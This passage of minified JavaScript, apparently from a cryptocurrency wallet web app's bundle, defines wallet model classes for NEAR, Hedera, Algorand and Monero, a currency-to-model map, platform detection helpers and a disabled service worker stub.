                        if (null == a || !a.hasSupportedGetBalance)
                            return;
                        const n = await a.getBalanceByAddress({
                            ...this.data,
                            address: e || this.data.address,
                            privateKey: t || this.data.privateKey
                        });
                        (0,
                        c.Q)(null == n ? void 0 : n.minimalBalance) && (this.data.minimalBalance = n.minimalBalance);
                        return (0,
                        c.Q)(null == n ? void 0 : n.balance) ? n.balance : void 0
                    } catch (e) {
                        G.warn(`_getBalanceByApi ${this.data.currency} failed ${e.message}`);
                        return
                    }
                }
                ));
                near_defineProperty(this, "getAvailableBalance", (async () => this.data.minimalBalance ? Promise.resolve((0,
                d.h9)(this.balance, this.data.minimalBalance).toString()) : Promise.resolve(this.balance)));
                near_defineProperty(this, "getClass", ( () => NearWalletModel));
                this.type = l.uQ.NEAR_WALLET
            }
        }
        var V = a(10072)
          , K = a(23042)
          , H = a(99137)
          , z = a(71957)
          , j = a(96306)
          , $ = a(103)
          , Z = a(74592)
          , Y = a(58276)
          , q = a(35082)
          , X = a(12813)
          , Q = a(18222)
          , J = a(38563)
          , ee = a(50336)
          , te = a(7512)
          , ae = a(88449)
          , ne = a(59849)
          , re = a(99954);
        function hbar_defineProperty(e, t, a) {
            (t = hbar_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function hbar_toPropertyKey(e) {
            var t = hbar_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function hbar_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const le = n.P.create({
            name: "hbar-wallet-model"
        });
        class HbarWalletModel extends o.b {
            constructor() {
                super();
                hbar_defineProperty(this, "SubWalletModel", i.Z);
                hbar_defineProperty(this, "areSubWalletsEqual", ( (e, t) => {
                    var a, n;
                    const r = null !== (a = null == e ? void 0 : e.data) && void 0 !== a ? a : e
                      , l = null !== (n = null == t ? void 0 : t.data) && void 0 !== n ? n : t;
                    return r.smartContract && l.smartContract ? (0,
                    s.Z)(r.smartContract) === (0,
                    s.Z)(l.smartContract) : (0,
                    s.Z)(r.currency) === (0,
                    s.Z)(l.currency)
                }
                ));
                hbar_defineProperty(this, "findSubWallet", (async e => {
                    if (e)
                        return this.subWallets.find((t => {
                            var a;
                            return (null == e ? void 0 : e.trim()) === (null == t || null === (a = t.data) || void 0 === a ? void 0 : a.smartContract)
                        }
                        ))
                }
                ));
                hbar_defineProperty(this, "isTokenValid", (async e => {
                    if (!e || !/^\d+\.\d+\.\d{6,}$/.test(e))
                        return {
                            valid: !1,
                            error: "Token Id is invalid"
                        };
                    const t = await this.findSubWallet(e);
                    if (t) {
                        var a;
                        return {
                            valid: !1,
                            error: "Token is already added",
                            token: null !== (a = null == t ? void 0 : t.data) && void 0 !== a ? a : t
                        }
                    }
                    try {
                        const t = await this.fetchTokenInfo(e);
                        return t.get(e) ? {
                            valid: !0,
                            error: null,
                            token: t.get(e)
                        } : {
                            valid: !1,
                            error: "Token Id is invalid"
                        }
                    } catch (e) {
                        return {
                            valid: !1,
                            error: "Network error. Please check your connection"
                        }
                    }
                }
                ));
                hbar_defineProperty(this, "fetchTokenInfo", (async e => {
                    const t = await u.Z.getApiByWallet(this.data)
                      , a = new Map;
                    if (!t)
                        return a;
                    try {
                        const {address: a, privateKey: n} = this.data
                          , r = undefined;
                        return await t.getTokenInfo(e, {
                            address: a,
                            privateKey: (0,
                            re.T9)(n)
                        })
                    } catch (e) {
                        console.info(e);
                        return a
                    }
                }
                ));
                hbar_defineProperty(this, "fetchAndAddTokenSubwallet", (async e => {
                    const t = "string" == typeof e ? [e] : e
                      , a = await u.Z.getApiByWallet(this.data);
                    if (!a || !("associateToken"in a))
                        throw new Error("Failed to load Blockchain adapter");
                    const n = t.filter((async e => {
                        const t = undefined;
                        return !await this.findSubWallet(e)
                    }
                    ))
                      , r = await this.fetchTokenInfo(n)
                      , l = undefined;
                    return {
                        ...await a.associateToken(n, this.data),
                        tokens: Array.from(r.values())
                    }
                }
                ));
                hbar_defineProperty(this, "getAvailableBalance", (async () => {
                    if ("hbar" === this.currency) {
                        const e = (0,
                        d.h9)(this.balance, .005).toString();
                        return Promise.resolve(Number(e) > 0 ? e : "0")
                    }
                    return Promise.resolve(this.balance)
                }
                ));
                hbar_defineProperty(this, "_createInstance", (async e => {
                    let {currency: t, privateKey: a, title: n, watchOnly: r, accountName: l, code: s} = e;
                    try {
                        const e = await u.Z.getApiByCurrency(t);
                        if (!e) {
                            le.warn(`Api not found ${this.data.currency}`);
                            throw new Error("Api not found")
                        }
                        let i;
                        i = a ? await e.getAddressFromPrivateKey({
                            privateKey: "string" == typeof a ? a.trim() : a,
                            currency: t
                        }) : await e.createWallet({
                            code: s
                        });
                        r && (i = {
                            currency: t,
                            accountName: l
                        });
                        if (i.error) {
                            const e = new Error;
                            e.code = i.error.code;
                            throw e
                        }
                        const o = undefined;
                        if (!(i.address || i.accountName))
                            throw new Error("Address not recognized");
                        Object.assign(this.data, {
                            accountName: i.accountName,
                            address: i.address,
                            currency: t,
                            title: n,
                            watchOnly: r,
                            uuid: (0,
                            m.Z)().slice(0, 8),
                            privateKey: i.privateKey,
                            publicKey: i.publicKey,
                            balance: this.data.balance || "0"
                        });
                        i.rewardAddress && Object.assign(this.data, {
                            rewardAddress: i.rewardAddress
                        });
                        i.publicKey && Object.assign(this.data, {
                            publicKey: i.publicKey
                        });
                        try {
                            await this.fetchSubWallets();
                            (a || r) && await this.updateBalance({
                                isNeedFetchTokensBalance: !1
                            })
                        } catch (e) {
                            console.error(e)
                        }
                        return this
                    } catch (e) {
                        le.error(`failed _createInstance for ${this.data.currency}`, e);
                        throw e
                    }
                }
                ));
                hbar_defineProperty(this, "getClass", ( () => HbarWalletModel));
                this.type = l.uQ.HBAR_WALLET
            }
        }
        function algo_defineProperty(e, t, a) {
            (t = algo_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function algo_toPropertyKey(e) {
            var t = algo_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function algo_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class AlgoWalletModel extends o.b {
            constructor() {
                super();
                algo_defineProperty(this, "SubWalletModel", i.Z);
                algo_defineProperty(this, "areSubWalletsEqual", ( (e, t) => (0,
                s.Z)(e.smartContract).toLowerCase() === (0,
                s.Z)(t.smartContract).toLowerCase()));
                algo_defineProperty(this, "getClass", ( () => AlgoWalletModel));
                this.data = {
                    type: l.uQ.ALGO_WALLET,
                    currency: "",
                    balance: "",
                    account: "",
                    address: "",
                    title: "",
                    uuid: "",
                    privateKey: ""
                }
            }
        }
        var se = a(68216)
          , ie = a(79433);
        function isValidSyncState(e) {
            return [e.blockchainHeight, e.startBlockHeight, e.targetBlockHeight, e.blocksScanned, e.estimatedTimeLeft].every(Number.isInteger) && e.blockchainHeight > 0
        }
        var oe = a(12002);
        function xmr_defineProperty(e, t, a) {
            (t = xmr_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function xmr_toPropertyKey(e) {
            var t = xmr_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function xmr_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const ce = n.P.create({
            name: "xmr-wallet-model"
        });
        var ue;
        !function(e) {
            e[e.AddressNotFound = 9] = "AddressNotFound"
        }(ue || (ue = {}));
        class XmrWalletModel extends BtcLikeWalletModel {
            constructor() {
                super();
                xmr_defineProperty(this, "SubWalletModel", f.n);
                xmr_defineProperty(this, "_createInstance", (async e => {
                    try {
                        const t = await u.Z.getApiByCurrency(e.currency);
                        if (!t) {
                            ce.warn(`Api not found ${this.data.currency}`);
                            throw new Error("Api not found")
                        }
                        if (e.watchOnly)
                            throw new Error("Watch only mode is not available on XMR");
                        const a = e.address || e.forceAddress
                          , n = e.privateKey ? await t.getAddressFromPrivateKey({
                            privateKey: "string" == typeof e.privateKey ? e.privateKey.trim() : e.privateKey,
                            currency: e.currency,
                            address: a
                        }) : await t.createWallet();
                        await t.login({
                            address: n.address,
                            privateKey: n.privateKey
                        });
                        Object.assign(this.data, {
                            address: n.address,
                            currency: e.currency,
                            title: e.title,
                            watchOnly: e.watchOnly,
                            uuid: (0,
                            m.Z)().slice(0, 8),
                            privateKey: n.privateKey,
                            balance: e.privateKey ? null : 0
                        });
                        return this
                    } catch (e) {
                        ce.error(`failed _createInstance for ${this.data.currency}`, e);
                        throw e
                    }
                }
                ));
                xmr_defineProperty(this, "updateBalance", (async () => {
                    this.storeManager && this.storeManager.setWalletBalanceUpdateStatus({
                        uuid: this.uuid,
                        apiStatus: oe.rA.Pending
                    });
                    const e = await u.Z.getApiByWallet(this.data);
                    if (null == e || !e.hasSupportedGetBalance)
                        return ce.error("API for XMR not found", this);
                    try {
                        const t = await e.getAddressInfo({
                            address: this.data.address,
                            privateKey: this.data.privateKey
                        });
                        (0,
                        c.Q)(t.lockedBalance) && (this.data.lockedBalance = t.lockedBalance);
                        (0,
                        c.Q)(t.balance) && (this.data.balance = t.balance);
                        isValidSyncState(t) ? this.syncState = t : ce.error("Invalid sync state", this);
                        if (!this.storeManager)
                            return ce.error("this.storeManager is null", this);
                        this.storeManager && this.storeManager.setWalletBalanceUpdateStatus({
                            uuid: this.uuid,
                            apiStatus: oe.rA.Resolved
                        });
                        this.storeManager.updateBalance(this);
                        this.storeManager.setWalletBalanceWasUpdatedByRest(this.data.uuid)
                    } catch (e) {
                        var t, a;
                        if ((null === (t = e.response) || void 0 === t || null === (a = t.data) || void 0 === a ? void 0 : a.code) === ue.AddressNotFound) {
                            this.syncState = {
                                isAddressNotFound: !0
                            };
                            this.storeManager && this.storeManager.setWalletBalanceUpdateStatus({
                                uuid: this.uuid,
                                apiStatus: oe.rA.Resolved
                            });
                            return
                        }
                        ce.error(`failed updateBalance for ${this.data.currency}`, e);
                        this.storeManager && this.storeManager.setWalletBalanceUpdateStatus({
                            uuid: this.uuid,
                            apiStatus: oe.rA.Rejected
                        })
                    }
                }
                ));
                this.type = l.uQ.BTC_LIKE_WALLET;
                this.subWalletsHidden = !0
            }
        }
        const de = n.P.create({
            name: "model-manager"
        });
        let me;
        !function(e) {
            e.bch = "bch";
            e.xec = "xec"
        }(me || (me = {}));
        const pe = {
            "btc-testnet": W.Z,
            "zec-testnet": BtcLikeWalletModel,
            "zil-testnet": BtcLikeWalletModel,
            btc: W.Z,
            ada: BtcLikeWalletModel,
            atom: BtcLikeWalletModel,
            aya: BtcLikeWalletModel,
            bsv: BtcLikeWalletModel,
            btcv: BtcLikeWalletModel,
            btg: BtcLikeWalletModel,
            bth: BtcLikeWalletModel,
            crm: BtcLikeWalletModel,
            dash: BtcLikeWalletModel,
            dcr: BtcLikeWalletModel,
            dgb: BtcLikeWalletModel,
            doge: BtcLikeWalletModel,
            ela: BtcLikeWalletModel,
            fio: BtcLikeWalletModel,
            firo: BtcLikeWalletModel,
            grs: BtcLikeWalletModel,
            kin: BtcLikeWalletModel,
            kas: BtcLikeWalletModel,
            kmd: BtcLikeWalletModel,
            lsk: BtcLikeWalletModel,
            ltc: BtcLikeWalletModel,
            nano: BtcLikeWalletModel,
            nlg: BtcLikeWalletModel,
            one: BtcLikeWalletModel,
            qtum: BtcLikeWalletModel,
            rdd: BtcLikeWalletModel,
            rvn: BtcLikeWalletModel,
            vtc: BtcLikeWalletModel,
            xem: BtcLikeWalletModel,
            xlm: BtcLikeWalletModel,
            xno: BtcLikeWalletModel,
            xrp: BtcLikeWalletModel,
            xtz: BtcLikeWalletModel,
            xvg: BtcLikeWalletModel,
            yec: BtcLikeWalletModel,
            zec: BtcLikeWalletModel,
            zen: BtcLikeWalletModel,
            zil: BtcLikeWalletModel,
            "eth-ropsten": M.Z,
            avax: M.Z,
            bsc: M.Z,
            clo: M.Z,
            etc: M.Z,
            eth: F.Z,
            etharb: M.Z,
            ethop: M.Z,
            ethw: F.Z,
            exp: M.Z,
            ggoe: F.Z,
            joys: M.Z,
            matic: M.Z,
            ropsten: M.Z,
            sol: M.Z,
            ubq: M.Z,
            xdc: M.Z,
            bera: M.Z,
            bone: M.Z,
            ton: U.Z,
            apt: U.Z,
            coreum: U.Z,
            dot: U.Z,
            egld: U.Z,
            inj: U.Z,
            ksm: U.Z,
            luna: U.Z,
            neo: U.Z,
            ont: U.Z,
            vet: U.Z,
            [me.bch]: BchWalletModel,
            [me.xec]: BchWalletModel,
            "ada-shelley": AdaShelleyWalletModel,
            eos: EosWalletModel,
            waves: WavesWalletModel,
            xmr: XmrWalletModel,
            "hbar-testnet": HbarWalletModel,
            hbar: HbarWalletModel,
            trx: TrxWalletModel,
            bnb: p.Z,
            near: NearWalletModel,
            algo: AlgoWalletModel
        }
          , fe = {
            btc: BtcLikeSegwitWalletModel,
            "btc-testnet": BtcLikeSegwitWalletModel,
            ltc: BtcLikeSegwitWalletModel,
            clo: EthLikeLedgerWalletModel,
            etc: EthLikeLedgerWalletModel,
            eth: EthLikeLedgerWalletModel,
            bnb: BnbLedgerWalletModel
        };
        class ModelManager {
            static getClass(e) {
                let {currency: t, hw: a} = e;
                const n = ModelManager.findModelClassByCurrency({
                    currency: t,
                    hw: a
                });
                if (n)
                    return n;
                de.warn(`model class for currecy ${t} ${a} not found`);
                throw new Error(`Model class for currecy ${t} ${a} not found`)
            }
            static findModelClassByCurrency(e) {
                let {currency: t, hw: a} = e
                  , n = pe;
                a === l.Vw.LEDGER && (n = fe);
                const r = n[t];
                return null != r ? r : null
            }
            static isSupported(e) {
                let {currency: t, hw: a} = e;
                const n = undefined;
                return ModelManager.findModelClassByCurrency({
                    currency: t,
                    hw: a
                }) || !1
            }
        }
    }
    ,
    65811: (e, t, a) => {
        "use strict";
        a.d(t, {
            uQ: () => n,
            _h: () => r,
            Vw: () => l,
            aO: () => s
        });
        const n = {
            BTC_LIKE_SEGWIT_WALLET: "BTC_LIKE_SEGWIT_WALLET",
            COMMON_WALLET: "COMMON_WALLET",
            ETH_LIKE_LEDGER_WALLET: "ETH_LIKE_LEDGER_WALLET",
            ETH_LIKE_WALLET: "ETH_LIKE_WALLET",
            BTC_LIKE_WALLET: "BTC_LIKE_WALLET",
            BNB_WALLET: "BNB_WALLET",
            OVERALL_WALLET: "OVERALL_WALLET",
            WAVES_WALLET: "WAVES_WALLET",
            EOS_WALLET: "EOS_WALLET",
            TRX_WALLET: "TRX_WALLET",
            ADA_SHELLEY_WALLET: "ADA_SHELLEY_WALLET",
            NEAR_WALLET: "NEAR_WALLET",
            HBAR_WALLET: "HBAR_WALLET",
            ALGO_WALLET: "ALGO_WALLET"
        }
          , r = {
            BITCOIN: "script",
            ETHEREUM: "smartContract"
        }
          , l = {
            LEDGER: "ledger",
            TREZOR: "trezor"
        }
          , s = {
            ERC20_TOKEN: "ERC20_TOKEN",
            SEGWIT_SUBWALLET: "SEGWIT_SUBWALLET",
            OVERALL_SUBWALLET: "OVERALL_SUBWALLET",
            BNB_TOKEN_SUBWALLET: "BNB_TOKEN_SUBWALLET",
            TRON_TOKEN_SUBWALLET: "TRON_TOKEN_SUBWALLET"
        }
    }
    ,
    13196: (e, t, a) => {
        "use strict";
        a.d(t, {
            d: () => isElectron,
            p1: () => isExtension,
            tq: () => isMobile,
            U_: () => isPlatformApp,
            CM: () => s,
            RU: () => getRootPath,
            dU: () => getEnv,
            Xf: () => getPlatform
        });
        var n = a(57506);
        let r, l;
        !function(e) {
            e.DEVELOPMENT = "app/development";
            e.STAGING = "app/staging";
            e.PRODUCTION = "app/production"
        }(r || (r = {}));
        !function(e) {
            e.WEB = "app/web";
            e.ELECTRON = "app/electron";
            e.EXTENSION = "app/extension";
            e.MOBILE = "app/mobile"
        }(l || (l = {}));
        const isElectron = () => {
            if (navigator && navigator.userAgent) {
                const e = undefined;
                if (navigator.userAgent.toLowerCase().indexOf(" electron/") > -1)
                    return !0
            }
            return !1
        }
          , isExtension = () => window.location.pathname.startsWith("/app/extension")
          , isMobile = () => window.location.pathname.startsWith("/app/mobile")
          , isPlatformApp = () => !isElectron() && !isExtension() && !isMobile()
          , s = !!(0,
        n.ZP)("developer-mode-active")
          , getRootPath = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ""
              , t = "/app";
            isExtension() && (t = "/app/extension");
            isMobile() && (t = "/app/mobile");
            return t + e
        }
          , getEnv = () => {
            0;
            0;
            return r.PRODUCTION
        }
          , getPlatform = () => isElectron() ? l.ELECTRON : isExtension() ? l.EXTENSION : isMobile() ? l.MOBILE : l.WEB
    }
    ,
    9710: (e, t, a) => {
        "use strict";
        a.d(t, {
            n: () => b
        });
        var n = a(38862)
          , r = a(15581)
          , l = a(2490)
          , s = a(34514)
          , i = a(41817)
          , o = a(42225)
          , c = a(40661)
          , u = a(80552)
          , d = a(67728)
          , m = a(14456)
          , p = a(67048)
          , f = a(13196)
          , E = a(66795);
        const h = undefined
          , g = "data:image/png;base64,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";
        var y;
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const v = a(12587).P.create({
            name: "SW"
        });
        class ServiceWorker {
            static register(e) {
                0;
                if (navigator && "serviceWorker"in navigator) {
                    const t = undefined;
                    if (true)
                        return;
                    window.addEventListener("load", ( () => {
                        const t = "/app/sw.js";
                        ServiceWorker.registerValidSW(t, e)
                    }
                    ))
                }
            }
            static registerValidSW(e, t) {
                const a = "/app/";
                navigator.serviceWorker.register(e, {
                    scope: a
                }).then(t.onSuccess).catch((e => {
                    v.error("Error during service worker registration:", e)
                }
                ))
            }
        }
